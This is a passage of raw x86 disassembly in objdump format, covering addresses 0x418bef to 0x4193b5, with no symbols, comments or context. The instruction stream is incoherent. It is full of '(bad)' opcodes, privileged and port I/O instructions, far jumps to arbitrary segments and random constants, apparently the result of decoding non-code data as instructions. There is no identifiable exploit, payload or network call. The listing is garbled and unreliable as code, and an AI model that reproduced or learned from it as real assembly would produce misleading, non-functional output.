  418bef:	push   edi
  418bf0:	aad    0x79
  418bf2:	jge    0x418c09
  418bf4:	sub    ah,BYTE PTR [ecx+0x57]
  418bf7:	ror    DWORD PTR [eax],cl
  418bf9:	and    al,0xc
  418bfb:	inc    edx
  418bfc:	cmp    ecx,0xffffffc0
  418bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c00:	add    DWORD PTR [esi],ebx
  418c02:	pop    ebp
  418c03:	int    0xba
  418c05:	cs push edx
  418c07:	repz and edx,ebp
  418c0a:	in     al,dx
  418c0b:	mov    fs,WORD PTR [ebx-0x69c0a411]
  418c11:	imul   eax,DWORD PTR [ebx-0x3de8e50c],0x4f93f3f1
  418c1b:	mov    al,0xbb
  418c1d:	sbb    ch,BYTE PTR [ebx+0x27]
  418c20:	push   ss
  418c21:	call   0xb7a44594
  418c26:	push   es
  418c27:	loop   0x418bec
  418c29:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c2b:	fsubr  QWORD PTR [edi-0x17]
  418c2e:	repnz test BYTE PTR [edx],al
  418c31:	push   ebp
  418c32:	jns    0x418c02
  418c34:	je     0x418bf0
  418c36:	cli    
  418c37:	jg     0x418bb9
  418c39:	dec    eax
  418c3a:	rcl    cl,1
  418c3c:	adc    BYTE PTR [esi-0x4f],0x9e
  418c40:	fld    DWORD PTR [edi+0x4a]
  418c43:	mov    esi,0x20dc79b8
  418c48:	dec    eax
  418c49:	or     edi,0x2
  418c4c:	xchg   DWORD PTR [ebx-0x174ab102],ebp
  418c52:	dec    eax
  418c53:	add    eax,0x41110326
  418c58:	ror    DWORD PTR [ecx+0x1eb1a30a],cl
  418c5e:	cwde   
  418c5f:	outs   dx,DWORD PTR ds:[esi]
  418c60:	fldenv [edx+0x4a1ad2e1]
  418c66:	push   ecx
  418c67:	ss inc eax
  418c69:	loop   0x418c00
  418c6b:	ss or  eax,0xbd85c77a
  418c71:	push   eax
  418c72:	xchg   ebp,eax
  418c73:	ficom  DWORD PTR [esi]
  418c75:	and    eax,0xd39de899
  418c7a:	into   
  418c7b:	fdivr  DWORD PTR [edi-0xafb2054]
  418c81:	mov    edx,0x5fe185d3
  418c86:	cdq    
  418c87:	xchg   ecx,eax
  418c88:	add    eax,0x7f1d9624
  418c8d:	int    0x43
  418c8f:	push   cs
  418c90:	push   0x57
  418c92:	scas   eax,DWORD PTR es:[edi]
  418c93:	ror    BYTE PTR [edi],1
  418c95:	fst    QWORD PTR [ecx-0x1334be83]
  418c9b:	leave  
  418c9c:	repnz mov ecx,DWORD PTR [eax+0x5e]
  418ca0:	add    al,0xab
  418ca2:	(bad)  
  418ca3:	fnstenv [edi]
  418ca5:	mov    edi,0x9a51ae92
  418caa:	jl     0x418c61
  418cac:	iret   
  418cad:	pop    edi
  418cae:	les    ecx,FWORD PTR [ecx-0x75]
  418cb1:	xchg   esp,eax
  418cb2:	mov    dh,0x21
  418cb4:	outs   dx,DWORD PTR ds:[esi]
  418cb5:	ins    BYTE PTR es:[edi],dx
  418cb6:	or     al,0xfc
  418cb8:	das    
  418cb9:	xlat   BYTE PTR ds:[ebx]
  418cba:	pop    esi
  418cbb:	cmp    edx,ebp
  418cbd:	in     al,0x7f
  418cbf:	aam    0x2b
  418cc1:	push   edx
  418cc2:	cmp    ecx,DWORD PTR [ebx+0x490e0601]
  418cc8:	push   cs
  418cc9:	mov    cl,0xc
  418ccb:	cmp    eax,0xea796f24
  418cd0:	or     eax,DWORD PTR [ecx+0x4a8e15ff]
  418cd6:	xchg   ebp,eax
  418cd7:	cmp    eax,0xd5f490cd
  418cdc:	sbb    bl,BYTE PTR [ecx+0xa]
  418cdf:	mov    BYTE PTR [ecx],dl
  418ce1:	mov    ds:0xfe938b6,al
  418ce6:	(bad)  
  418ce7:	call   0x63f9f7d8
  418cec:	clts   
  418cee:	jb     0x418d35
  418cf0:	pop    fs
  418cf2:	and    BYTE PTR [esi+0x4343c49f],bl
  418cf8:	xchg   ebx,eax
  418cf9:	or     ebx,esp
  418cfb:	push   ebp
  418cfc:	sub    BYTE PTR [esi+0x2d9f820],0x5d
  418d03:	jg     0x418cb6
  418d05:	pop    esp
  418d06:	shl    BYTE PTR [eax+eiz*1],0xe9
  418d0a:	mov    ds:0x85ce5e1a,eax
  418d0f:	mov    esp,0x9368be73
  418d14:	mov    dl,0x64
  418d16:	mov    eax,ds:0x7faf408c
  418d1b:	pop    ebp
  418d1c:	dec    ebp
  418d1d:	or     eax,DWORD PTR [eax-0x421c612f]
  418d23:	dec    ebp
  418d24:	aad    0x5c
  418d26:	int    0x52
  418d28:	int3   
  418d29:	dec    esi
  418d2a:	shl    DWORD PTR [ecx+0x64a6ccda],1
  418d30:	pop    ecx
  418d31:	popa   
  418d32:	imul   ecx,DWORD PTR [eax+0x5cdc41a5],0xffffffae
  418d39:	rcl    BYTE PTR [edx],1
  418d3b:	sti    
  418d3c:	adc    BYTE PTR [eax+0x44dded47],0xa6
  418d43:	daa    
  418d44:	jge    0x418cf6
  418d46:	jbe    0x418d19
  418d48:	mov    DWORD PTR [edi+0x7b686e46],esp
  418d4e:	mov    al,0xb5
  418d50:	or     ecx,DWORD PTR [eax]
  418d52:	jb     0x418d7b
  418d54:	and    ch,BYTE PTR [edi-0x56d78c9d]
  418d5a:	xchg   ebp,eax
  418d5b:	lea    eax,[ecx+0xe]
  418d5e:	fld    DWORD PTR [ebx+0xf40f9d4]
  418d64:	imul   ecx,DWORD PTR [edx],0x9f8f6bfe
  418d6a:	or     DWORD PTR [edx-0x59],esi
  418d6d:	(bad)  
  418d6e:	xchg   esp,eax
  418d6f:	add    DWORD PTR [eax-0x9],edi
  418d72:	cmp    BYTE PTR [esi],0x8b
  418d75:	push   ss
  418d76:	ror    DWORD PTR [edx+0x6368e0dd],0xdb
  418d7d:	sub    al,0x0
  418d7f:	fs stc 
  418d81:	mov    DWORD PTR [esi],0x4209746e
  418d87:	xchg   edx,eax
  418d88:	ja     0x418d64
  418d8a:	iret   
  418d8b:	scas   eax,DWORD PTR es:[edi]
  418d8c:	call   0x7e6d81bb
  418d91:	rol    DWORD PTR [esi-0x1c],0x92
  418d95:	fwait
  418d96:	pop    esi
  418d97:	loopne 0x418d25
  418d99:	(bad)  
  418d9a:	push   0x8ed69947
  418d9f:	fidiv  DWORD PTR [eax-0x60592ce9]
  418da5:	fisttp WORD PTR [ecx+0x2f]
  418da8:	out    dx,eax
  418da9:	test   DWORD PTR es:[edx],ecx
  418dac:	add    BYTE PTR [ebp-0x29],ah
  418daf:	stos   BYTE PTR es:[edi],al
  418db0:	xchg   esp,eax
  418db1:	push   ebp
  418db2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  418db4:	out    dx,eax
  418db5:	xchg   ebx,eax
  418db6:	push   edi
  418db7:	mov    ds:0x7ef4782,al
  418dbc:	sub    esi,DWORD PTR [eax-0x68ff1670]
  418dc2:	mov    BYTE PTR [edi],bh
  418dc4:	sub    BYTE PTR [eax+0x7],ah
  418dc7:	sbb    esi,DWORD PTR [ebx+0x60]
  418dca:	scas   al,BYTE PTR es:[edi]
  418dcb:	xchg   DWORD PTR [ebp+0x3b],edi
  418dce:	jae    0x418e45
  418dd0:	xchg   ebx,eax
  418dd1:	xchg   BYTE PTR [esi+0x28a0697c],dl
  418dd7:	retf   0x2be9
  418dda:	(bad)  
  418ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ddc:	and    DWORD PTR [ecx-0x157cf762],edi
  418de2:	pop    ds
  418de3:	mov    dh,0x4b
  418de5:	sbb    al,0x95
  418de7:	outs   dx,BYTE PTR ds:[esi]
  418de8:	xchg   ecx,eax
  418de9:	xchg   ah,dl
  418deb:	xor    cl,BYTE PTR ds:0xf8e81dee
  418df1:	arpl   WORD PTR [ebx],bp
  418df3:	retf   
  418df4:	mov    cl,BYTE PTR [edi]
  418df6:	sub    DWORD PTR [esi],edi
  418df8:	in     eax,dx
  418df9:	jl     0x418dcb
  418dfb:	in     eax,0xd5
  418dfd:	mov    bh,0x82
  418dff:	inc    esp
  418e00:	xlat   BYTE PTR ds:[ebx]
  418e01:	cmp    BYTE PTR [ebx-0x7e],cl
  418e04:	sar    BYTE PTR [eax+ebp*8-0x76],cl
  418e08:	sti    
  418e09:	imul   ebx,DWORD PTR [ebx+ebx*8],0x11
  418e0d:	mov    DWORD PTR [ebp+0x6d4cd383],eax
  418e13:	inc    ebp
  418e14:	xchg   DWORD PTR [esi],ebp
  418e16:	bound  edx,QWORD PTR [edx-0x264145a3]
  418e1c:	clc    
  418e1d:	inc    edi
  418e1e:	xchg   esp,eax
  418e1f:	sbb    al,0x23
  418e21:	in     eax,0xf4
  418e23:	adc    bl,BYTE PTR [ecx+0x6b]
  418e26:	cwde   
  418e27:	inc    ebx
  418e28:	mov    bl,0xe0
  418e2a:	add    DWORD PTR [ebx+0x4284763e],0xc85afe10
  418e34:	idiv   BYTE PTR [eax+0x26]
  418e37:	jno    0x418e80
  418e39:	(bad)  
  418e3a:	repnz adc edx,eax
  418e3d:	(bad)  
  418e3f:	into   
  418e40:	out    dx,al
  418e41:	imul   edi,DWORD PTR [edi-0x15],0xbfa622d9
  418e48:	bound  ecx,QWORD PTR [edi+ecx*4+0x22]
  418e4c:	add    dh,BYTE PTR [eax]
  418e4e:	or     DWORD PTR [ebx-0x28],ebp
  418e51:	fnstenv [edx]
  418e53:	pop    esp
  418e54:	mov    WORD PTR [edi+0x1335873e],?
  418e5a:	and    eax,0xdf50d467
  418e5f:	dec    edx
  418e60:	scas   eax,DWORD PTR es:[edi]
  418e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e62:	xchg   esi,eax
  418e63:	dec    ecx
  418e64:	pop    ebx
  418e65:	scas   al,BYTE PTR es:[edi]
  418e66:	ins    BYTE PTR es:[edi],dx
  418e67:	nop
  418e68:	add    al,al
  418e6a:	xor    eax,0x6e8c95a
  418e6f:	and    esi,ebp
  418e71:	cmp    ebx,DWORD PTR [ebp-0x60]
  418e74:	add    edi,DWORD PTR [edx-0x7c]
  418e77:	cli    
  418e78:	mov    al,BYTE PTR [esp+ebp*8+0xf76127c]
  418e7f:	repnz adc DWORD PTR [ecx-0xacaf07b],edx
  418e86:	jno    0x418edc
  418e88:	jmp    0x48e1:0xf2442502
  418e8f:	jns    0x418e9e
  418e91:	push   ds
  418e92:	or     ah,BYTE PTR [ecx]
  418e94:	std    
  418e95:	shl    DWORD PTR [ebp-0x31b2b922],cl
  418e9b:	sar    BYTE PTR [esi-0x3f],1
  418e9e:	adc    ah,dh
  418ea0:	outs   dx,DWORD PTR ds:[esi]
  418ea1:	fisttp QWORD PTR [esi+0x6d]
  418ea4:	cvtdq2ps xmm5,XMMWORD PTR [edx+0x19]
  418ea8:	aaa    
  418ea9:	fisttp QWORD PTR [ecx-0x7c385271]
  418eaf:	push   ebx
  418eb0:	fs (bad) 
  418eb2:	xor    al,BYTE PTR [esi]
  418eb4:	inc    ecx
  418eb5:	ja     0x418f0b
  418eb7:	retf   
  418eb8:	xor    BYTE PTR [esi],cl
  418eba:	cmp    DWORD PTR [eax],ecx
  418ebc:	inc    ebx
  418ebd:	fld    QWORD PTR [esi+0x5c]
  418ec0:	cmp    esp,DWORD PTR [eax]
  418ec2:	clc    
  418ec3:	jmp    0x299a:0x138c4bd1
  418eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ecb:	pop    ds
  418ecc:	xor    eax,ebp
  418ece:	add    al,0x2d
  418ed0:	mov    ch,0xae
  418ed2:	jp     0x418eef
  418ed4:	sbb    edx,DWORD PTR [ebp+ebp*4-0x6f4d7ffd]
  418edb:	mov    bh,0x8
  418edd:	jnp    0x418e81
  418edf:	cld    
  418ee0:	xor    eax,0xcc6066ea
  418ee6:	jp     0x418ee3
  418ee8:	push   eax
  418ee9:	aas    
  418eea:	inc    DWORD PTR [edi+0x3c]
  418eed:	push   ebp
  418eee:	(bad)  
  418eef:	xor    eax,0x8f8a0f9f
  418ef4:	jmp    0xd653:0xe5caee84
  418efb:	inc    esp
  418efc:	sbb    bl,BYTE PTR [edx+0x60]
  418eff:	cmp    esi,esi
  418f01:	and    esp,edx
  418f03:	ss retf 
  418f05:	fcmovb st,st(6)
  418f07:	add    al,0x80
  418f09:	imul   eax,esp,0x282abdb9
  418f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f10:	das    
  418f11:	push   0x42214f81
  418f16:	out    0xcf,eax
  418f18:	inc    ebp
  418f19:	and    DWORD PTR [ebx-0x5ca615d3],eax
  418f1f:	mov    esp,0xced94b3b
  418f24:	cmp    BYTE PTR [edx-0x37],bl
  418f27:	pop    es
  418f28:	add    DWORD PTR ss:[ebx-0x151451ed],edi
  418f2f:	xor    BYTE PTR [ebx+ecx*8-0x11],bh
  418f33:	and    al,0xf5
  418f35:	data16 jecxz 0x418f44
  418f38:	rcr    bl,0x21
  418f3b:	or     al,0xe2
  418f3d:	data16 fist WORD PTR [ebx-0x5b]
  418f41:	int3   
  418f42:	xor    eax,0x372f5973
  418f47:	sub    edx,0xffffffa1
  418f4a:	mov    eax,0x88eeec2
  418f4f:	mov    ecx,0x6ccdd34d
  418f54:	jge    0x418f58
  418f56:	inc    ecx
  418f57:	inc    ebp
  418f58:	fidiv  WORD PTR [ebp+0x54101b79]
  418f5e:	inc    esp
  418f5f:	outs   dx,DWORD PTR ds:[esi]
  418f60:	push   ss
  418f61:	pop    eax
  418f62:	mov    eax,ds:0x17c21dc4
  418f67:	out    0x5a,al
  418f69:	cs loope 0x418faf
  418f6c:	stc    
  418f6d:	xchg   edx,eax
  418f6e:	push   edx
  418f6f:	cmp    DWORD PTR [ecx+0x2ce95181],ebp
  418f75:	mov    eax,ds:0x8b4d3bb6
  418f7a:	dec    ebp
  418f7b:	dec    edx
  418f7c:	jl     0x418ff1
  418f7e:	dec    bh
  418f80:	and    eax,0xf9d85197
  418f85:	in     al,0x25
  418f87:	nop
  418f88:	sub    eax,0x677af80
  418f8d:	out    0x1a,eax
  418f8f:	gs jmp 0xe771:0x8ab26927
  418f97:	ret    
  418f98:	or     BYTE PTR [ebp-0x46],dl
  418f9b:	xor    ebp,DWORD PTR [ebp+edx*4+0x46]
  418f9f:	shl    BYTE PTR [esi+0x1f],0xd1
  418fa3:	mov    edx,0xd42dafb5
  418fa8:	jnp    0x418fe5
  418faa:	jmp    0x555262a5
  418faf:	inc    edx
  418fb0:	jnp    0x418fb3
  418fb2:	mov    edx,DWORD PTR [esi]
  418fb4:	sbb    dl,BYTE PTR [ebp-0x64f39aa6]
  418fba:	jge    0x418ffa
  418fbc:	push   0x6bc29afb
  418fc1:	cmp    BYTE PTR [ebp+ecx*1+0x67e36542],0x2e
  418fc9:	popf   
  418fca:	jle    0x419025
  418fcc:	lds    esp,FWORD PTR [edi-0x1ef27e9e]
  418fd2:	push   esi
  418fd3:	in     eax,dx
  418fd4:	imul   ecx,DWORD PTR [edi+0x2995b8d6],0xffffffde
  418fdb:	adc    DWORD PTR [edx-0x6f],ecx
  418fde:	cmp    eax,0x44504874
  418fe3:	add    eax,0x9e063603
  418fe8:	lea    ecx,[edi]
  418fea:	xchg   ebx,eax
  418feb:	add    al,0x2b
  418fed:	sub    esp,DWORD PTR [ecx]
  418fef:	or     eax,0x9f730970
  418ff4:	mov    fs,edi
  418ff6:	sub    bh,BYTE PTR [eax]
  418ff8:	ret    0xf149
  418ffb:	mov    edi,0x714e5079
  419000:	dec    eax
  419001:	cwde   
  419002:	mov    WORD PTR [esp+esi*2-0x61],cs
  419006:	push   esp
  419007:	pop    eax
  419008:	mov    esp,0xb697023c
  41900d:	clc    
  41900e:	inc    esi
  41900f:	movlps QWORD PTR [ecx],xmm1
  419012:	inc    edi
  419013:	imul   esi,DWORD PTR [ecx-0x61],0xffffffd7
  419017:	dec    eax
  419018:	aam    0x3b
  41901a:	ins    DWORD PTR es:[edi],dx
  41901b:	enter  0x51ca,0xf4
  41901f:	and    ah,BYTE PTR [edi-0x35]
  419022:	adc    bh,al
  419024:	sub    al,0xdb
  419026:	ret    
  419027:	or     dl,ah
  419029:	das    
  41902a:	mov    ebx,0xf9d204b3
  41902f:	and    eax,0x50a3a1e2
  419034:	and    al,0x79
  419036:	mov    bl,0x1
  419038:	repz cwde 
  41903a:	mov    ds:0x5426d22e,al
  41903f:	js     0x41904f
  419041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419042:	dec    BYTE PTR ds:0xd54fc9ba
  419048:	(bad)  
  419049:	xor    eax,DWORD PTR [ecx+0x73]
  41904c:	or     al,dl
  41904e:	pop    edi
  41904f:	jnp    0x419020
  419051:	jmp    0x418fde
  419053:	into   
  419054:	pop    esp
  419055:	push   edx
  419056:	aas    
  419057:	mov    BYTE PTR [ecx-0x7af60b34],0xb9
  41905e:	dec    esi
  41905f:	aaa    
  419060:	xchg   esi,eax
  419061:	pop    esp
  419062:	(bad)  
  419063:	cli    
  419064:	in     al,0x10
  419066:	or     ebx,edi
  419068:	ds mov esi,0xfa477bb1
  41906e:	and    BYTE PTR [ebx],bh
  419070:	jecxz  0x418ff3
  419072:	lds    esi,FWORD PTR [edx+esi*4]
  419075:	jmp    0x2f35:0x5a1d3132
  41907c:	xor    al,0x4e
  41907e:	aam    0x48
  419080:	xor    DWORD PTR [ecx+esi*2],0xde6c7bdc
  419087:	or     al,0xe8
  419089:	pushf  
  41908a:	out    dx,al
  41908b:	xchg   esi,eax
  41908c:	mov    dh,0xc8
  41908e:	sub    bl,BYTE PTR [esi]
  419090:	inc    edi
  419091:	cwde   
  419092:	xor    bh,cl
  419094:	mov    ecx,0x311d453c
  419099:	into   
  41909a:	pushf  
  41909b:	addr16 iret 
  41909d:	xchg   ebx,eax
  41909e:	xor    DWORD PTR ds:0x387ae572,esi
  4190a4:	jnp    0x4190fe
  4190a6:	mov    al,0x8a
  4190a8:	and    al,0xc7
  4190aa:	mov    ebp,0xb3900c56
  4190af:	rcr    cl,cl
  4190b1:	ror    DWORD PTR [ebp-0x2a3e4de1],1
  4190b7:	push   esp
  4190b8:	push   esi
  4190b9:	stos   BYTE PTR es:[edi],al
  4190ba:	js     0x41904b
  4190bc:	int3   
  4190bd:	mov    bh,0x76
  4190bf:	mov    BYTE PTR [esi+0xd04eb43],dh
  4190c5:	pop    ecx
  4190c6:	int    0xc3
  4190c8:	stos   BYTE PTR es:[edi],al
  4190c9:	or     DWORD PTR [eax+esi*2-0x1b],ebx
  4190cd:	nop
  4190ce:	cli    
  4190cf:	push   0xffffffcd
  4190d1:	retf   0x5961
  4190d4:	test   dl,cl
  4190d6:	add    al,0x23
  4190d8:	fs addr16 pop ss
  4190db:	jne    0x419060
  4190dd:	lea    esp,[ecx+ecx*1-0x7ee774e0]
  4190e4:	call   0xe97915a8
  4190e9:	popa   
  4190ea:	dec    ebx
  4190eb:	dec    eax
  4190ec:	shl    DWORD PTR [esi-0x6ad76569],cl
  4190f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190f3:	mov    eax,0xa369e99d
  4190f8:	ja     0x419083
  4190fa:	push   cs
  4190fb:	mov    BYTE PTR [ebx-0x5a],ah
  4190fe:	lea    eax,[eax-0x682ad4]
  419104:	cmp    al,0x6a
  419106:	cld    
  419107:	test   al,0x11
  419109:	pop    ebp
  41910a:	loopne 0x419110
  41910c:	jecxz  0x419097
  41910e:	loop   0x419186
  419110:	mov    ebx,0x18a22bc6
  419115:	in     al,dx
  419116:	(bad)
  419119:	push   ebx
  41911a:	jbe    0x419190
  41911c:	loop   0x41910b
  41911e:	aas    
  41911f:	xor    al,0xb0
  419121:	jmp    0x4190b5
  419123:	pop    ecx
  419124:	je     0x4190e6
  419126:	xchg   edi,eax
  419127:	pop    ss
  419128:	mov    eax,ds:0x3bd25ddb
  41912d:	dec    ebx
  41912e:	xor    dl,ah
  419130:	xchg   esp,eax
  419131:	add    BYTE PTR [edi],0x45
  419134:	push   eax
  419135:	stos   BYTE PTR es:[edi],al
  419136:	fbld   TBYTE PTR [ebp+0x74f406bf]
  41913c:	push   cs
  41913d:	pop    eax
  41913e:	inc    ebx
  41913f:	sbb    BYTE PTR fs:[esp+eiz*2-0x3d],0xfd
  419145:	jne    0x4190d0
  419147:	imul   edi,DWORD PTR [eax-0x70],0x16
  41914b:	popa   
  41914c:	fsubp  st(7),st
  41914e:	lds    ebp,FWORD PTR [edx+0x62]
  419151:	xacquire xchg DWORD PTR [edx+0xcb4139e],ecx
  419158:	sbb    cl,cl
  41915a:	jns    0x41914e
  41915c:	jns    0x41918c
  41915e:	out    0xfb,al
  419160:	pushf  
  419161:	and    al,0x26
  419163:	mov    eax,0xe7ed3d0d
  419168:	inc    ebp
  419169:	ja     0x4191e5
  41916b:	xchg   edi,eax
  41916c:	fisttp WORD PTR [edi]
  41916e:	out    0xeb,al
  419170:	popf   
  419171:	gs jb  0x41912f
  419174:	adc    eax,DWORD PTR [edx-0x5e]
  419177:	jae    0x4190fa
  419179:	mov    edi,0xfd3f4080
  41917e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41917f:	loop   0x419106
  419181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419182:	inc    esi
  419183:	sub    DWORD PTR [esi+esi*2],ebx
  419186:	xor    al,BYTE PTR [edx+0x22]
  419189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41918a:	addr16 mov ds:0x9c9d,eax
  41918e:	out    dx,eax
  41918f:	push   edx
  419190:	cld    
  419191:	stc    
  419192:	in     al,dx
  419193:	stos   DWORD PTR es:[edi],eax
  419194:	das    
  419195:	push   cs
  419196:	jo     0x41914a
  419198:	js     0x419191
  41919a:	(bad)  
  41919c:	je     0x4191c5
  41919e:	sbb    BYTE PTR [ebx],ch
  4191a0:	cdq    
  4191a1:	xor    ebp,0x57
  4191a4:	push   0xffffffc0
  4191a6:	loope  0x41914f
  4191a8:	fsub   st(2),st
  4191aa:	(bad)  
  4191ab:	out    dx,al
  4191ac:	and    BYTE PTR [edx-0x3dc859b3],al
  4191b2:	push   eax
  4191b3:	bound  edx,QWORD PTR ds:0xbe0199ac
  4191b9:	test   eax,0x326dff22
  4191be:	mov    al,ds:0x111324b9
  4191c3:	jmp    DWORD PTR ds:0x677ccc93
  4191c9:	and    al,0x25
  4191cb:	cmp    eax,DWORD PTR [ebx-0x79]
  4191ce:	mov    ch,BYTE PTR [ebx]
  4191d0:	popa   
  4191d1:	cmp    ebx,esi
  4191d3:	adc    ah,bl
  4191d5:	sub    DWORD PTR [eax],esp
  4191d7:	dec    ebp
  4191d8:	or     BYTE PTR [ebx+0x4b],0xa6
  4191dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191dd:	daa    
  4191de:	sbb    eax,0x49f58b2a
  4191e3:	fisub  WORD PTR [eax]
  4191e5:	inc    esp
  4191e6:	jge    0x4191d9
  4191e8:	and    al,0x8e
  4191ea:	dec    edi
  4191eb:	cmp    DWORD PTR [ebp+0x1e],ebx
  4191ee:	(bad)  
  4191ef:	inc    ebx
  4191f0:	ds mov eax,0xf37c07ed
  4191f6:	(bad)  
  4191f8:	or     eax,DWORD PTR [edx+0x3d]
  4191fb:	adc    al,BYTE PTR [edi]
  4191fd:	xor    eax,edx
  4191ff:	mov    edx,0x776e7f5
  419204:	pop    edi
  419205:	int    0x5b
  419207:	pop    ebx
  419208:	call   0x1ce7:0x8a7a107d
  41920f:	hlt    
  419210:	xchg   edi,eax
  419211:	pop    esp
  419212:	push   es
  419213:	(bad)  
  419214:	mov    al,0xc3
  419216:	sub    BYTE PTR [ecx-0x5c4f5d5],0xe5
  41921d:	lods   eax,DWORD PTR ds:[esi]
  41921e:	jg     0x41924c
  419220:	popf   
  419221:	stc    
  419222:	(bad)
  419225:	sub    eax,0x7c0e97aa
  41922a:	dec    ebx
  41922b:	xchg   esp,eax
  41922c:	inc    ebp
  41922d:	mov    ch,cl
  41922f:	mov    bl,0x74
  419231:	fnstenv ds:0x3c75f842
  419237:	fsubrp st(6),st
  419239:	jmp    0x419229
  41923b:	jle    0x419282
  41923d:	outs   dx,BYTE PTR ds:[esi]
  41923e:	mov    dh,0xc2
  419240:	adc    bl,BYTE PTR [esi]
  419242:	fstp   TBYTE PTR [eax+0x4d6aadd2]
  419248:	shl    BYTE PTR [esi+0x53],1
  41924b:	inc    esi
  41924c:	lahf   
  41924d:	rcl    BYTE PTR [edx+eiz*1-0x72ae3697],1
  419254:	inc    eax
  419255:	data16 mov ds:0xdf840973,al
  41925b:	xor    BYTE PTR [ebp-0x2c],bl
  41925e:	mov    ah,0x14
  419260:	inc    ecx
  419261:	mov    ebp,0xee5d633e
  419266:	mov    bh,0x73
  419268:	cmp    dl,BYTE PTR [edi+ebx*2-0x25]
  41926c:	cmc    
  41926d:	out    0x31,eax
  41926f:	cmp    esp,esp
  419271:	cwde   
  419272:	sbb    BYTE PTR [edi+0x49049c81],al
  419278:	ins    DWORD PTR es:[edi],dx
  419279:	adc    al,al
  41927b:	mov    gs,WORD PTR [ebx]
  41927d:	xchg   esp,eax
  41927e:	in     eax,dx
  41927f:	and    edi,ebp
  419281:	add    ecx,esp
  419283:	and    ch,BYTE PTR [edi+0x7e1e722c]
  419289:	(bad)  
  41928a:	nop
  41928b:	push   ebx
  41928c:	nop
  41928d:	pusha  
  41928e:	jo     0x419233
  419290:	js     0x4192e5
  419292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419293:	shr    ebp,1
  419295:	repz xor DWORD PTR [ecx-0x1c],ecx
  419299:	jmp    0x3780d13e
  41929e:	imul   esi,DWORD PTR [ebx+0x4],0xffffffa3
  4192a2:	cmp    BYTE PTR [edi+0x2a68e2ee],dh
  4192a8:	aad    0x60
  4192aa:	and    al,0x93
  4192ac:	rcl    DWORD PTR [ebp-0x49876c65],1
  4192b2:	addr16 test eax,0x44f26c56
  4192b8:	inc    ebx
  4192b9:	xor    eax,0x72997832
  4192be:	je     0x4192c7
  4192c0:	adc    BYTE PTR [eax-0x2f],cl
  4192c3:	push   ecx
  4192c4:	jmp    0x419264
  4192c6:	fisub  DWORD PTR [esi]
  4192c8:	xor    bl,BYTE PTR [esi]
  4192ca:	sar    dh,cl
  4192cc:	cmp    bh,BYTE PTR ds:0xa42b7471
  4192d2:	scas   eax,DWORD PTR es:[edi]
  4192d3:	sub    dh,cl
  4192d5:	fstp   st(4)
  4192d7:	xchg   ebp,eax
  4192d8:	aaa    
  4192d9:	jmp    0x47c2755d
  4192de:	push   cs
  4192df:	int    0x65
  4192e1:	or     edi,DWORD PTR [edx+0x3]
  4192e4:	stos   DWORD PTR es:[edi],eax
  4192e5:	sbb    eax,0x86c5a432
  4192ea:	xchg   ebx,eax
  4192eb:	daa    
  4192ec:	add    BYTE PTR [ebx],0x5a
  4192ef:	fwait
  4192f0:	push   ecx
  4192f1:	addr16 dec ebx
  4192f3:	outs   dx,BYTE PTR ds:[esi]
  4192f4:	data16 or al,BYTE PTR [ecx+ecx*4+0x4]
  4192f9:	aad    0x25
  4192fb:	test   eax,0xd278bf90
  419300:	mov    edx,0x6a86a54e
  419305:	jmp    0x4dd63f83
  41930a:	xchg   esp,eax
  41930b:	rcl    DWORD PTR [eax],1
  41930d:	pop    ds
  41930e:	lods   al,BYTE PTR ds:[esi]
  41930f:	lahf   
  419310:	xchg   ebp,eax
  419311:	shl    DWORD PTR [edi+0x2d],cl
  419314:	in     eax,0x90
  419316:	fwait
  419317:	jge    0x4192eb
  419319:	retf   
  41931a:	pusha  
  41931b:	cmp    eax,0xd1b274c8
  419320:	pop    es
  419321:	mov    bh,0xb2
  419323:	sub    BYTE PTR [ebx+0x75973757],dl
  419329:	inc    edi
  41932a:	out    0xe2,al
  41932c:	stos   DWORD PTR es:[edi],eax
  41932d:	aaa    
  41932e:	adc    ebx,DWORD PTR [ebx+0x1]
  419331:	or     ecx,DWORD PTR gs:[edi+0x725ae90]
  419338:	jae    0x419390
  41933a:	or     cl,BYTE PTR [esi-0x19a2b025]
  419340:	stc    
  419341:	jge    0x419330
  419343:	bound  edx,QWORD PTR [edx+esi*2+0x19]
  419347:	int3   
  419348:	mov    ah,0x1d
  41934a:	pop    ss
  41934b:	jb     0x419314
  41934d:	js     0x419344
  41934f:	fs cli 
  419351:	bound  edi,QWORD PTR [ecx]
  419353:	int3   
  419354:	pop    edi
  419355:	and    eax,eax
  419357:	pop    ecx
  419358:	fistp  QWORD PTR [ebp+0x10cb9676]
  41935e:	inc    edi
  41935f:	pushw  0x1d
  419362:	jp     0x419359
  419364:	xor    al,0x7d
  419366:	xchg   ebp,eax
  419367:	test   DWORD PTR [edi],0x9d237d17
  41936d:	enter  0x98a5,0xb0
  419371:	adc    al,0xb0
  419373:	xchg   edx,eax
  419374:	mov    ebp,0x9d09cd66
  419379:	jne    0x419300
  41937b:	jmp    0x9b4b:0xe1f3f467
  419382:	fcompp 
  419384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419385:	ds adc eax,eax
  419388:	jmp    0x4193df
  41938a:	inc    esi
  41938b:	push   cs
  41938c:	mov    ecx,0x73f87ead
  419391:	fdivrp st(3),st
  419393:	add    BYTE PTR [edi-0x234a2be7],dl
  419399:	icebp  
  41939a:	inc    eax
  41939b:	xor    dl,BYTE PTR [edi+ebx*8+0x5a]
  41939f:	ins    DWORD PTR es:[edi],dx
  4193a0:	sub    ecx,esp
  4193a2:	and    al,0x64
  4193a4:	inc    ecx
  4193a5:	fcmovbe st,st(5)
  4193a7:	(bad)  [edx-0x1d]
  4193aa:	sti    
  4193ab:	retf   0xac84
  4193ae:	call   0xc3ea:0x9df29fdf
  4193b5:	jl     0x419356
